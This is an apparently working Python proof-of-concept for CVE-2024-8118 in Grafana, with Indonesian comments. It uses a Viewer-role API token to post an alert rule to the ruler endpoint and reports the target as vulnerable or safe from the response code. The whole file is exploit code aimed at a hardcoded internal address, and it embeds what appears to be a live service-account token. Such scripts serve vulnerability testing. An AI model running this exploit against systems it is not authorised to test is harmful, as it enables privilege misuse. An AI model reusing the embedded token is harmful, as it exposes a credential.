import requests
import json

# ===== KONFIGURASI =====
grafana_url = "http://192.168.88.162:3000"  # Ganti sesuai target
token = "glsa_upeqNLHsKh6WqDaXKajW5X60BIfYP7ii_31713b8e"           # Ganti dengan token Viewer
datasource_uid = "fesklh3l2db7kb"  # Lihat dari URL datasource
namespace = "default"                      # Bisa juga gunakan custom namespace

# ===== HEADER & PAYLOAD =====
headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

payload = {
    "name": "poc-alert",
    "rules": [{
        "alert": "poc_alert",
        "expr": "up == 0",
        "for": "1m",
        "labels": {
            "severity": "critical"
        },
        "annotations": {
            "summary": "PoC CVE-2024-8118 alert"
        }
    }]
}

# ===== URL ENDPOINT =====
endpoint = f"{grafana_url}/api/ruler/{datasource_uid}/api/v1/rules/{namespace}"

# ===== EKSEKUSI REQUEST =====
response = requests.post(endpoint, headers=headers, data=json.dumps(payload))

# ===== CETAK HASIL =====
print("Status Code:", response.status_code)
print("Response Body:", response.text)

if response.status_code == 200:
    print("[!] Vulnerable to CVE-2024-8118: Viewer berhasil membuat alert!")
elif response.status_code == 403:
    print("[âœ“] Aman: Viewer tidak memiliki izin membuat alert.")
else:
    print("[?] Respon tidak terduga, perlu dicek manual.")
